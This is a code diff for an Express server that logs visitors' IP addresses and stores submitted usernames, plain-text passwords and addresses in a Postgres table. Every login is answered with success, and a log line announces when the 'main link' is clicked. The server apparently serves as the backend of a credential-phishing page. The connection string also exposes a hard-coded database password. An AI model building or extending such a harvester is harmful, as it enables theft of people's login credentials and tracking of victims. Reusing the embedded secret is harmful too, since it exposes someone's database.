@@ -10,6 +10,7 @@ const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -17,33 +18,42 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     password TEXT,
     address TEXT,
     ip TEXT,
-    timestamp TEXT,
-    status TEXT DEFAULT 'Pending'
+    timestamp TEXT
 )`);
 
-// Save Record
+function getRealIP(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+           req.headers['x-real-ip'] ||
+           req.ip ||
+           'Unknown';
+}
+
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
     );
+    console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 }
 
-// Routes
+// Record Page Visit Immediately
 app.get('/', (req, res) => {
-    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    const ip = getRealIP(req);
+    saveRecord('Page Visit', null, null, null, ip);
+    console.log("🔴 MAIN LINK CLICKED! Real IP:", ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    const ip = getRealIP(req);
+    saveRecord('Page Visit', null, null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 app.post('/api/login', (req, res) => {
     const { username, password, address } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
